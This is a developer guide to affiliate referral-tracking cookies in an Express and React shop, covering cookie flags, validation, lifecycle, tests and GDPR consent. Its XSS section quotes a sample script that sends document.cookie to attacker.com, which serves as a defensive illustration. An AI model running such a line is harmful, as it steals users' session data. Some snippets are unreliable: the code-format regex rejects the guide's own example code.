# Referral Tracking - Cookie Management Best Practices Guide

## Table of Contents

1. [Cookie Architecture](#cookie-architecture)
2. [Cookie Setting & Configuration](#cookie-setting--configuration)
3. [Cookie Reading & Validation](#cookie-reading--validation)
4. [Cookie Security](#cookie-security)
5. [Cookie Lifecycle Management](#cookie-lifecycle-management)
6. [Frontend Cookie Handling](#frontend-cookie-handling)
7. [Backend Cookie Operations](#backend-cookie-operations)
8. [Troubleshooting Common Issues](#troubleshooting-common-issues)
9. [Testing Cookie Functionality](#testing-cookie-functionality)
10. [Privacy Compliance](#privacy-compliance)

---

## Cookie Architecture

### Overview

The referral tracking system uses **two complementary cookies** to track affiliate attribution across the entire customer journey:

```
Referral Click
       │
       ▼
┌─────────────────────────────┐
│ affiliateId (HttpOnly)      │  ← Secure attribution
│ - Backend access only       │  - MongoDB ObjectId
│ - 90-day TTL               │  - Used for attribution
│ - Max security             │
└─────────────────────────────┘

┌─────────────────────────────┐
│ affiliateCode (Public)      │  ← Reference for analytics
│ - Frontend can read         │  - Human-readable code
│ - 90-day TTL               │  - For UI display
│ - Medium security          │
└─────────────────────────────┘

       │
       ▼
Customer Browsing
       │
       ▼
Checkout
       │
       ▼
┌─────────────────────────────┐
│ affiliateId → Order         │  ← Used for attribution
│ affiliateCode → Analytics   │  ← Used for reporting
└─────────────────────────────┘

       │
       ▼
Commission Calculated
       │
       ▼
Affiliate Earns
```

### Cookie Pair Relationship

| Aspect | affiliateId | affiliateCode |
|--------|------------|---------------|
| **Purpose** | Attribution | Reference/Analytics |
| **Visibility** | Server-only (HttpOnly) | Client & Server |
| **Format** | MongoDB ObjectId | AFF12345678 |
| **Security** | Very High | High |
| **Used During** | Checkout payment | Analytics & UI |
| **Example Value** | 507f1f77bcf... | AFF12345678 |

---

## Cookie Setting & Configuration

### When Cookies Are Set

```javascript
// File: src/controllers/affiliateController.js
// Endpoint: GET /api/tracking/click?ref=AFF12345678
// When: Affiliate referral link is clicked

async recordReferralClick(req, res, next) {
  // 1. Validate affiliate code
  // 2. Record click in database
  // 3. SET THE COOKIES (most critical step)
  
  res.cookie('affiliateId', trackingData.affiliateId.toString(), {
    maxAge: 90 * 24 * 60 * 60 * 1000, // 90 days in milliseconds
    httpOnly: true,                     // HTTPONLY: Prevents JavaScript access
    secure: process.env.NODE_ENV === 'production', // SECURE: HTTPS only
    sameSite: 'Lax',                   // SAMESITE: CSRF protection
    path: '/',                         // PATH: Available on all paths
  });
  
  res.cookie('affiliateCode', trackingData.affiliateCode, {
    maxAge: 90 * 24 * 60 * 60 * 1000,
    httpOnly: false,                    // Can be read by JavaScript
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'Lax',
    path: '/',
  });
}
```

### Cookie Duration Calculation

```javascript
// Cookie Duration Settings

// 90 days = 7,776,000,000 milliseconds
const ninetySomeDays = 90 * 24 * 60 * 60 * 1000;

// Break it down:
// 90 days × 24 hours/day × 60 min/hour × 60 sec/min × 1000 ms/sec
// = 7,776,000,000 ms

// In Node.js/Express:
res.cookie('affiliateId', value, {
  maxAge: ninetySomeDays, // Cookie expires in 90 days
  expires: new Date(Date.now() + ninetySomeDays) // Or explicit date
});

// In JavaScript (frontend):
document.cookie = `affiliateCode=AFF12345678; max-age=${ninetySomeDays}; path=/`;
```

### Cookie Configuration for Different Environments

#### Development Environment

```javascript
// .env
NODE_ENV=development

// src/controllers/affiliateController.js
res.cookie('affiliateId', value, {
  maxAge: 90 * 24 * 60 * 60 * 1000,
  httpOnly: true,
  secure: false,                        // HTTP in development
  sameSite: 'Lax',
  path: '/',
  domain: 'localhost'                  // Local domain
});
```

#### Staging Environment

```javascript
// .env
NODE_ENV=staging

// src/controllers/affiliateController.js
res.cookie('affiliateId', value, {
  maxAge: 90 * 24 * 60 * 60 * 1000,
  httpOnly: true,
  secure: true,                        // HTTPS required
  sameSite: 'Lax',
  path: '/',
  domain: '.staging.spherekings.com'  // Staging subdomain
});
```

#### Production Environment

```javascript
// .env
NODE_ENV=production

// src/controllers/affiliateController.js
res.cookie('affiliateId', value, {
  maxAge: 90 * 24 * 60 * 60 * 1000,
  httpOnly: true,
  secure: true,                        // HTTPS required (enforced)
  sameSite: 'Strict',                  // Stricter CSRF protection
  path: '/',
  domain: '.spherekings.com'          // Main domain for subdomains
});
```

---

## Cookie Reading & Validation

### Reading Cookies on Backend

The Express `cookie-parser` middleware automatically parses cookies into `req.cookies`:

```javascript
// middleware registered in src/server.js
app.use(cookieParser());

// Now in any route handler:
app.get('/any-endpoint', (req, res) => {
  // req.cookies is populated automatically
  const affiliateId = req.cookies.affiliateId;
  const affiliateCode = req.cookies.affiliateCode;
  
  console.log('affiliateId:', affiliateId);      // 507f... (ObjectId string)
  console.log('affiliateCode:', affiliateCode);  // AFF12345678
});
```

### Example: Reading in Checkout

```javascript
// File: src/controllers/checkoutController.js

async createCheckoutSession(req, res, next) {
  try {
    const userId = req.user._id;
    
    // Step 1: Try to get affiliateId from cookies first
    let affiliateId = req.cookies?.affiliateId;
    
    // Step 2: Otherwise, try query parameter (for manual entry)
    if (!affiliateId) {
      affiliateId = req.query.affiliateId || req.body.affiliateId;
    }
    
    // Step 3: Validate affiliateId if present
    if (affiliateId) {
      const affiliate = await Affiliate.findById(affiliateId);
      if (!affiliate) {
        console.warn(`Invalid affiliateId: ${affiliateId}`);
        affiliateId = null; // Clear invalid ID
      }
    }
    
    // Step 4: Create session with affiliate info
    const sessionData = await checkoutService.createCheckoutSession(
      userId,
      cartService,
      productService,
      affiliateId // Pass to service
    );
    
    return res.status(201).json({
      success: true,
      message: 'Checkout session created',
      data: {
        sessionId: sessionData.sessionId,
        url: sessionData.url,
      },
    });
  } catch (error) {
    next(error);
  }
}
```

### Validating Cookie Integrity

```javascript
// File: src/middlewares/validateReferralCookie.js

/**
 * Middleware to validate that affiliate cookies point to active affiliates
 * Clears invalid cookies to prevent issues later
 */
async function validateReferralCookie(req, res, next) {
  try {
    const affiliateId = req.cookies?.affiliateId;
    
    // If no cookie, continue (not an error)
    if (!affiliateId) {
      return next();
    }
    
    // Validate affiliate exists
    const affiliate = await Affiliate.findById(affiliateId);
    
    if (!affiliate) {
      console.warn(`Cookie referenced non-existent affiliate: ${affiliateId}`);
      // Clear both cookies
      res.clearCookie('affiliateId');
      res.clearCookie('affiliateCode');
      return next();
    }
    
    // Validate affiliate is active
    if (affiliate.status !== 'active') {
      console.warn(`Cookie referenced inactive affiliate: ${affiliateId}`);
      // Clear cookies
      res.clearCookie('affiliateId');
      res.clearCookie('affiliateCode');
      return next();
    }
    
    // Attach valid affiliate to request for downstream use
    req.validAffiliate = affiliate;
    next();
  } catch (error) {
    console.error('Cookie validation error:', error);
    // Continue anyway, don't block request
    next();
  }
}

module.exports = validateReferralCookie;
```

---

## Cookie Security

### Security Flags Explained

#### 1. HttpOnly Flag

```javascript
// SECURE: Cannot be accessed by JavaScript
res.cookie('affiliateId', value, {
  httpOnly: true  // ← RECOMMENDED for sensitive data
});

// Benefits:
// - Prevents XSS attacks stealing cookies
// - Only transmitted with HTTP requests (automatic)
// - Cannot be read by document.cookie

// Example Attack Prevented:
// Malicious JavaScript runs: document.cookie // Won't see affiliateId
// Only backend can read it during payment

// What you CAN'T do with HttpOnly cookies:
// document.cookie doesn't contain affiliateId
// JavaScript fetch auto-sends it, but can't inspect it
// XMLHttpRequest auto-sends it, but can't read it

// Safe to NOT use HttpOnly:
res.cookie('affiliateCode', value, {
  httpOnly: false // OK for non-sensitive data (display only)
});
```

#### 2. Secure Flag

```javascript
// SECURE: Only sent over HTTPS
res.cookie('affiliateId', value, {
  secure: process.env.NODE_ENV === 'production'
});

// Benefits:
// - Prevents man-in-the-middle attacks
// - Cookie only transmitted over encrypted connection
// - HTTP requests will NOT include cookie

// Example Protection:
// HTTPS request to api.spherekings.com → Cookie sent ✓
// HTTP request to api.spherekings.com → Cookie NOT sent ✓

// Development Consideration:
// In development (http://localhost:3000), secure:false allows testing
// In production (https://spherekings.com), secure:true enforces HTTPS
```

#### 3. SameSite Flag

```javascript
// SAMESITE: CSRF (Cross-Site Request Forgery) protection
res.cookie('affiliateId', value, {
  sameSite: 'Lax'  // or 'Strict' for maximum protection
});

// SameSite Options:
// ───────────────────────────────────────────────────────────
//
// SameSite: Strict
//   Cookie sent: Only same-site requests
//   Example: On spherekings.com, affiliate cookie sent
//   If attacker.com tries: affiliate cookie NOT sent ✓
//
// SameSite: Lax (DEFAULT)
//   Cookie sent: Same-site + top-level navigation
//   Example: Link from attacker.com → spherekings.com (sent)
//            Form from attacker.com → spherekings.com (not sent)
//
// SameSite: None
//   Cookie sent: All requests (cross-site)
//   Requires: Secure flag
//   Use case: Third-party embeds only

// Production Recommendation:
// Use 'Strict' for sensitive operations (payments, payout settings)
res.cookie('affiliateId', value, {
  sameSite: 'Strict', // Maximum CSRF protection
  secure: true
});
```

### XSS Prevention

```javascript
// PROBLEM: XSS Attack
// ─────────────────────────────────────────────────────────
//
// 1. Attacker injects script into page:
//    <script>
//      // This runs on user's browser while on spherekings.com
//      const cookies = document.cookie;
//      fetch('https://attacker.com/steal?c=' + cookies);
//    </script>
//
// 2. Attacker steals all cookies
// 3. Attacker can impersonate user

// SOLUTION: HttpOnly Flag
// ─────────────────────────────────────────────────────────
//
// res.cookie('affiliateId', value, {
//   httpOnly: true  // ← This prevents the theft
// });
//
// Now if attacker runs above script:
// document.cookie returns: "affiliateCode=AFF12345678"
// (affiliateId is NOT present in document.cookie)
//
// Attacker cannot steal the sensitive cookie!
```

### Cookie Validation Middleware

```javascript
// File: src/middlewares/secureCookieHandler.js

/**
 * Middleware to ensure cookies are handled securely
 * Run this on sensitive endpoints like checkout
 */
function secureCookieHandler(req, res, next) {
  // 1. Validate cookie format
  const affiliateId = req.cookies?.affiliateId;
  
  if (affiliateId) {
    // Must be valid MongoDB ObjectId
    const objectIdRegex = /^[0-9a-f]{24}$/i;
    if (!objectIdRegex.test(affiliateId)) {
      console.warn(`Invalid affiliateId format: ${affiliateId}`);
      res.clearCookie('affiliateId');
      res.clearCookie('affiliateCode');
      return res.status(400).json({
        success: false,
        message: 'Invalid cookie format'
      });
    }
  }
  
  // 2. Validate affiliateCode format
  const affiliateCode = req.cookies?.affiliateCode;
  
  if (affiliateCode) {
    // Must match pattern: AFF[11 alphanumeric chars]
    const codeRegex = /^AFF[A-Z0-9]{11}$/;
    if (!codeRegex.test(affiliateCode)) {
      console.warn(`Invalid affiliateCode format: ${affiliateCode}`);
      res.clearCookie('affiliateCode');
      return res.status(400).json({
        success: false,
        message: 'Invalid affiliate code format'
      });
    }
  }
  
  next();
}

module.exports = secureCookieHandler;
```

---

## Cookie Lifecycle Management

### Creation → Expiration

```
Day 0: Click Affiliate Link
├─ GET /api/tracking/click?ref=AFF12345678
├─ Cookies created with maxAge = 7,776,000,000 ms (90 days)
├─ Express sets: Set-Cookie headers in response
└─ Browser stores cookies

Day 1-89: Active Usage
├─ User browses site
├─ Cookies present in browser storage
├─ Each HTTP request includes cookies automatically
├─ Checkout can read affiliateId from cookies
└─ Attribution can occur

Day 90: Cookie Expires
├─ Browser automatically removes cookies
├─ maxAge duration has elapsed
├─ Cookies no longer sent with requests
├─ New affiliate attribution no longer possible
└─ Existing orders already attributed

Day 90+: After Expiration
├─ User can still click new referral links
├─ New referral tracking record created
├─ New cookies set (another 90-day window)
└─ Cycle repeats
```

### Clearing Cookies

```javascript
// Clearing Individual Cookies
res.clearCookie('affiliateId');      // Clear specific cookie
res.clearCookie('affiliateCode');

// Clearing Multiple Cookies in One Operation
['affiliateId', 'affiliateCode'].forEach(cookieName => {
  res.clearCookie(cookieName);
});

// Clear with domain/path (must match original)
res.clearCookie('affiliateId', {
  path: '/',
  domain: '.spherekings.com'
});

// When to Clear Cookies
// ──────────────────────────────────────────────────────
// 1. User logs out
// 2. Invalid affiliate detected
// 3. Affiliate account suspended
// 4. User requests data deletion (GDPR)
// 5. Security breach detected
```

### Cookie Expiration Strategies

#### Strategy 1: Automatic Expiration (Current Implementation)

```javascript
// Set cookie with maxAge
res.cookie('affiliateId', value, {
  maxAge: 90 * 24 * 60 * 60 * 1000  // Expires in 90 days
});

// Browser automatically removes cookie after 90 days
// No server action needed
// Simple and reliable
```

#### Strategy 2: Session-Based Expiration

```javascript
// Set cookie without maxAge (session cookie)
res.cookie('affiliateId', value, {
  // No maxAge = expires when browser closes
});

// Pros: Shorter exposure window
// Cons: User loses attribution if browser closed
// Use for: High-risk scenarios only
```

#### Strategy 3: User-Initiated Logout

```javascript
// When user explicitly logs out
app.post('/auth/logout', (req, res) => {
  res.clearCookie('affiliateId');
  res.clearCookie('affiliateCode');
  
  res.json({
    success: true,
    message: 'Logged out, cookies cleared'
  });
});
```

---

## Frontend Cookie Handling

### Reading Cookies in JavaScript

```javascript
// Read all cookies
const allCookies = document.cookie;
// Output: "affiliateCode=AFF12345678; sessionId=xyz123; other=value"

// Parse and get specific cookie
function getCookie(name) {
  const nameEQ = name + '=';
  const cookies = document.cookie.split('; ');
  
  for (let cookie of cookies) {
    if (cookie.startsWith(nameEQ)) {
      return cookie.substring(nameEQ.length);
    }
  }
  
  return null;
}

// Usage
const affiliateCode = getCookie('affiliateCode');
console.log(affiliateCode); // Output: AFF12345678

// NOTE: affiliateId (HttpOnly) will NOT be visible here!
// That's correct - it's only sent by browser automatically
```

### Using Cookie Parser Library (Recommended)

```javascript
// Install: npm install js-cookie
import Cookies from 'js-cookie';

// Set cookie
Cookies.set('affiliateCode', 'AFF12345678', {
  expires: 90,        // 90 days
  secure: true,       // HTTPS only
  sameSite: 'Lax'     // CSRF protection
});

// Get cookie
const code = Cookies.get('affiliateCode');

// Remove cookie
Cookies.remove('affiliateCode');

// Get all cookies
const allCookies = Cookies.get();
```

### Sending Cookies with Fetch Requests

```javascript
// Cookies need to be explicitly sent with fetch
// (They're not sent by default for cross-origin requests)

// Same-origin requests (automatic)
fetch('/api/affiliate/dashboard', {
  headers: { 'Authorization': `Bearer ${token}` }
});
// Cookies automatically included ✓

// Cross-origin requests (need credentials)
fetch('https://api.example.com/endpoint', {
  credentials: 'include',  // ← THIS is required
  headers: { 'Authorization': `Bearer ${token}` }
});
// Now cookies will be included in cross-origin requests
```

### Detecting Referral in Frontend

```javascript
// File: src/pages/landing.js (or wherever user lands after click)

import { useEffect } from 'react';
import Cookies from 'js-cookie';

export default function LandingPage() {
  useEffect(() => {
    // Check if affiliate cookie exists
    const affiliateCode = Cookies.get('affiliateCode');
    
    if (affiliateCode) {
      console.log(`You were referred by: ${affiliateCode}`);
      
      // Show thank you message
      // Track in analytics
      // Display referral bonus if applicable
    }
  }, []);
  
  return <div>Welcome!</div>;
}
```

### Passing Affiliate to Checkout

```javascript
// File: src/pages/checkout.js

import React, { useEffect, useState } from 'react';
import Cookies from 'js-cookie';

export default function CheckoutPage() {
  const [affiliateCode, setAffiliateCode] = useState(null);
  
  useEffect(() => {
    // Get affiliate code from cookie
    const code = Cookies.get('affiliateCode');
    setAffiliateCode(code);
  }, []);
  
  const handleCheckout = async () => {
    // Send affiliate code to checkout endpoint
    const response = await fetch('/api/checkout/create-session', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      credentials: 'include', // Include cookies!
      body: JSON.stringify({
        affiliateCode: affiliateCode
      })
    });
    
    const data = await response.json();
    
    if (data.success) {
      // Redirect to Stripe checkout
      window.location.href = data.data.url;
    }
  };
  
  return (
    <div>
      <h1>Checkout</h1>
      {affiliateCode && <p>Affiliate: {affiliateCode}</p>}
      <button onClick={handleCheckout}>Proceed to Payment</button>
    </div>
  );
}
```

---

## Backend Cookie Operations

### Express Cookie Parser Middleware Setup

```javascript
// File: src/server.js

const express = require('express');
const cookieParser = require('cookie-parser');

const app = express();

// IMPORTANT: Must come AFTER body parser, BEFORE routes
app.use(express.json());
app.use(cookieParser()); // ← Enables req.cookies

// NOW all route handlers have access to req.cookies
app.get('/api/affiliate/dashboard', (req, res) => {
  console.log(req.cookies); // { affiliateId: '507f...', affiliateCode: 'AFF...' }
});
```

### Reading Cookies in Routes

```javascript
// File: src/routes/checkoutRoutes.js

router.post('/create-session', authenticate, async (req, res, next) => {
  try {
    // Method 1: From cookies (automatic from browser)
    const affiliateIdFromCookie = req.cookies?.affiliateId;
    
    // Method 2: From request body (frontend sends explicitly)
    const affiliateIdFromBody = req.body?.affiliateId;
    
    // Method 3: From query parameter
    const affiliateIdFromQuery = req.query?.affiliateId;
    
    // Priority: cookie > body > query
    const affiliateId = affiliateIdFromCookie || affiliateIdFromBody || affiliateIdFromQuery;
    
    // Create checkout with affiliate
    const session = await checkoutService.createCheckoutSession(
      req.user._id,
      cartService,
      productService,
      affiliateId
    );
    
    res.json(session);
  } catch (error) {
    next(error);
  }
});
```

### Secure Cookie Operations

```javascript
// File: src/controllers/checkoutController.js

/**
 * Verify cookies are valid before using them
 */
async function verifyCookies(req, res, next) {
  const affiliateId = req.cookies?.affiliateId;
  
  // Skip if no cookie
  if (!affiliateId) return next();
  
  try {
    // Verify it's a valid ObjectId
    if (!ObjectId.isValid(affiliateId)) {
      res.clearCookie('affiliateId');
      return next();
    }
    
    // Verify affiliate still exists and is active
    const affiliate = await Affiliate.findById(affiliateId);
    if (!affiliate || affiliate.status !== 'active') {
      res.clearCookie('affiliateId');
      res.clearCookie('affiliateCode');
      return next();
    }
    
    // Verify affiliateCode cookie matches
    const cookieCode = req.cookies?.affiliateCode;
    if (cookieCode !== affiliate.affiliateCode) {
      // Mismatch - might be tampering
      console.warn('Cookie mismatch detected');
      res.clearCookie('affiliateId');
      res.clearCookie('affiliateCode');
    }
    
    next();
  } catch (error) {
    console.error('Cookie verification error:', error);
    next();
  }
}

// Use in checkout
router.post('/create-session', authenticate, verifyCookies, createCheckoutSession);
```

---

## Troubleshooting Common Issues

### Issue 1: Cookies Not Being Set

#### Symptoms
- Cookies don't appear in browser after clicking referral link
- No Set-Cookie headers in response

#### Debug Steps

```javascript
// 1. Check if tracking endpoint is being called
app.get('/api/tracking/click', (req, res) => {
  console.log('Tracking endpoint called with ref:', req.query.ref);
  // Output should appear in console
});

// 2. Check if cookies are being set
res.cookie('affiliateId', value, {...});
console.log('Cookie set:', {...}); // Log the settings

// 3. Check response headers
// In browser DevTools → Network tab
// Look for: Set-Cookie headers in Response Headers
```

#### Solutions

```javascript
// A. Ensure cookieParser is registered
app.use(cookieParser());

// B. Set cookies on correct response object
// ❌ Wrong:
app.get('/api/tracking/click', async (req, res) => {
  const response = await fetch(...);
  // res here is Express response, not fetch response
});

// ✓ Correct:
app.get('/api/tracking/click', (req, res) => {
  res.cookie('affiliateId', value, {...}); // Use Express res
  res.json({...});
});

// C. Verify domain/path
res.cookie('affiliateId', value, {
  path: '/',              // Accessible on all paths
  domain: '.spherekings.com', // Share across subdomains
});

// D. Check environment for secure flag
res.cookie('affiliateId', value, {
  secure: process.env.NODE_ENV === 'production'
  // Should be: false in dev (HTTP friendly)
  //           true in prod (HTTPS required)
});
```

### Issue 2: Cookies Not Persisting

#### Symptoms
- Cookies are set but disappear on page reload
- Cookies not sent to checkout endpoint

#### Debug Steps

```javascript
// 1. Check cookie settings in Network tab
// Response Headers → Set-Cookie
// Should show:
// Set-Cookie: affiliateId=507f...; Max-Age=7776000; Path=/; Secure; HttpOnly; SameSite=Lax

// 2. Check maxAge calculation
const maxAgeInMs = 90 * 24 * 60 * 60 * 1000;
console.log('Max-Age:', maxAgeInMs); // Should be: 7776000000

// 3. Verify domain setting for subdomains
// If browser is on: app.spherekings.com
// Cookie domain should be: .spherekings.com
// (Note the leading dot)
```

#### Solutions

```javascript
// A. Verify maxAge is numeric (not string)
res.cookie('affiliateId', value, {
  maxAge: 7776000000,  // ✓ Numeric
  // NOT
  maxAge: '7776000000' // ✗ String
});

// B. Check for cookies allowed in browser
// Browser settings → Cookies & Site data
// Make sure cookies aren't auto-deleted

// C. Try expires instead of maxAge
res.cookie('affiliateId', value, {
  expires: new Date(Date.now() + 90 * 24 * 60 * 60 * 1000)
});

// D. Use correct domain for your setup
// Local: domain: 'localhost'
// Staging: domain: '.staging.spherekings.com'
// Prod: domain: '.spherekings.com'
```

### Issue 3: Cookies Not Sent to Checkout

#### Symptoms
- Cookies set successfully
- But affiliateId not available in checkout endpoint

#### Debug Steps

```javascript
// 1. Verify cookies in browser
// DevTools → Application → Cookies → spherekings.com
// Should list: affiliateId, affiliateCode

// 2. Check Network tab
// When calling checkout endpoint:
// Request Cookies should include affiliate cookies

// 3. Log in checkout handler
router.post('/create-session', (req, res) => {
  console.log('Cookies:', req.cookies); // Should include affiliateId
});
```

#### Solutions

```javascript
// A. Must register cookieParser BEFORE routes
app.use(express.json());
app.use(cookieParser()); // ← Before routes!
app.use('/api', routes);

// B. Ensure credentials sent with fetch
const response = await fetch('/api/checkout/create-session', {
  method: 'POST',
  credentials: 'include', // ← CRITICAL for cookies
  headers: {...}
});

// C. Check for domain/path mismatch
// If tracking endpoint is: /api/tracking/click
// And checkout is: /api/checkout/create-session
// Both under same domain → cookies shared ✓

// D. Verify SameSite setting
res.cookie('affiliateId', value, {
  sameSite: 'Lax' // ← Allows form submissions
  // NOT
  sameSite: 'Strict' // ← Too restrictive for some scenarios
});

// E. For local development without HTTPS
res.cookie('affiliateId', value, {
  secure: false, // ← Allow HTTP in dev
  sameSite: 'Lax'
});
```

### Issue 4: HttpOnly Cookie Not Accessible

#### This is Not a Bug - It's a Feature!

```javascript
// EXPECTED BEHAVIOR:
// ──────────────────────────────────────────────────────

// Browser console:
console.log(document.cookie);
// Output: "affiliateCode=AFF12345678" (affiliateId NOT shown)

// This is CORRECT!
// affiliateId is HttpOnly, so it's not visible to JavaScript

// How it still works:
// 1. Browser sends ALL cookies (including HttpOnly) with HTTP requests
// 2. Server reads affiliateId from req.cookies (automatic)
// 3. So checkout gets the cookie even though JS can't see it

// Verification that it works:
app.post('/api/checkout/create-session', (req, res) => {
  // affiliateId IS available here, even though JS can't see it
  const affiliateId = req.cookies.affiliateId;
  console.log(affiliateId); // Outputs: 507f...
});
```

---

## Testing Cookie Functionality

### Manual Testing in Browser

```javascript
// 1. Open DevTools (F12)
// 2. Go to Network tab
// 3. Click affiliate link
// 4. Check response headers for Set-Cookie
// 5. Go to Application tab → Cookies → spherekings.com
// 6. Verify both cookies present

// Quick test in console:
// Read cookies (affiliateCode only, affiliateId is HttpOnly)
console.log(document.cookie);

// Set custom cookie (for testing)
document.cookie = "test=value; path=/";

// Clear cookie
document.cookie = "test=; max-age=0; path=/";
```

### Automated Testing

```javascript
// File: tests/integration/cookieTracking.test.js

describe('Cookie Tracking', () => {
  it('should set both cookies on referral click', async () => {
    const response = await request(app)
      .get('/api/tracking/click')
      .query({ ref: 'AFF12345678' });
    
    expect(response.status).toBe(200);
    expect(response.headers['set-cookie']).toBeDefined();
    
    const cookies = response.headers['set-cookie'];
    expect(cookies.some(c => c.includes('affiliateId'))).toBe(true);
    expect(cookies.some(c => c.includes('affiliateCode'))).toBe(true);
  });
  
  it('affiliateId cookie should be HttpOnly', async () => {
    const response = await request(app)
      .get('/api/tracking/click')
      .query({ ref: 'AFF12345678' });
    
    const affiliateIdCookie = response.headers['set-cookie'].find(
      c => c.includes('affiliateId')
    );
    
    expect(affiliateIdCookie).toMatch(/HttpOnly/);
  });
  
  it('should persist cookies across requests', async () => {
    const agent = request.agent(app);
    
    // First request: set cookies
    await agent
      .get('/api/tracking/click')
      .query({ ref: 'AFF12345678' });
    
    // Second request: cookies should be sent automatically
    const checkoutRes = await agent
      .post('/api/checkout/create-session')
      .set('Authorization', `Bearer ${token}`);
    
    expect(checkoutRes.status).toBe(201);
  });
});
```

---

## Privacy Compliance

### GDPR Compliance for Cookies

```javascript
// Before setting any tracking cookies, ensure:

// 1. User Consent (Critical!)
// Must show cookie banner BEFORE setting cookies
if (userHasConsentedToMarketingCookies) {
  res.cookie('affiliateId', value, {...});
}

// 2. Cookie Policy
// Document:
// - What cookies are used
// - Why they're used
// - How long they persist
// - How users can opt-out

// 3. Clear Cookies on Opt-Out
if (!userConsentsToMarketingCookies) {
  res.clearCookie('affiliateId');
  res.clearCookie('affiliateCode');
}

// 4. Provide Data Access
// Users can request all their data including cookies

// 5. Deletion on Request (GDPR Right to Be Forgotten)
app.post('/api/user/delete-my-data', async (req, res) => {
  const userId = req.user._id;
  
  // Clear affiliate cookies
  res.clearCookie('affiliateId');
  res.clearCookie('affiliateCode');
  
  // Delete referral tracking records
  await ReferralTracking.deleteMany({ visitorId: userId });
  
  // Delete user data
  await User.findByIdAndDelete(userId);
  
  res.json({ success: true, message: 'Data deleted' });
});
```

### Cookie Banner Implementation

```javascript
import React, { useEffect, useState } from 'react';
import Cookies from 'js-cookie';

export default function CookieBanner() {
  const [showBanner, setShowBanner] = useState(false);
  
  useEffect(() => {
    // Check if user has already consented
    const hasConsented = Cookies.get('cookie-consent');
    if (!hasConsented) {
      setShowBanner(true);
    }
  }, []);
  
  const acceptCookies = () => {
    // Set consent cookie
    Cookies.set('cookie-consent', 'accepted', { expires: 365 });
    setShowBanner(false);
    
    // Now safe to load tracking cookies
    loadAffiliateTracking();
  };
  
  const rejectCookies = () => {
    // Clear any tracking cookies
    Cookies.remove('affiliateId');
    Cookies.remove('affiliateCode');
    setShowBanner(false);
  };
  
  if (!showBanner) return null;
  
  return (
    <div className="cookie-banner">
      <p>We use cookies to track affiliate referrals</p>
      <button onClick={acceptCookies}>Accept</button>
      <button onClick={rejectCookies}>Reject</button>
    </div>
  );
}
```

---

## Summary

**Key Takeaways:**

1. ✅ **Two Cookies**: `affiliateId` (secure) + `affiliateCode` (public)
2. ✅ **HttpOnly**: Prevents JavaScript theft of sensitive cookies
3. ✅ **Secure**: HTTPS only in production
4. ✅ **SameSite**: CSRF protection
5. ✅ **90-Day Duration**: Attribution window for purchases
6. ✅ **Automatic Handling**: Browser sends cookies, server reads them
7. ✅ **Security First**: Validation at every step
8. ✅ **GDPR Ready**: Consent-based, user control

**Testing Checklist:**

- [ ] Cookies set when affiliate link clicked
- [ ] affiliateId is HttpOnly (not visible in console)
- [ ] affiliateCode is readable (for analytics)
- [ ] Cookies persist across page navigation
- [ ] Cookies sent to checkout endpoint
- [ ] Order attributed correctly to affiliate
- [ ] Invalid cookies detected and cleared
- [ ] Cookies expire after 90 days
- [ ] GDPR consent obtained before tracking
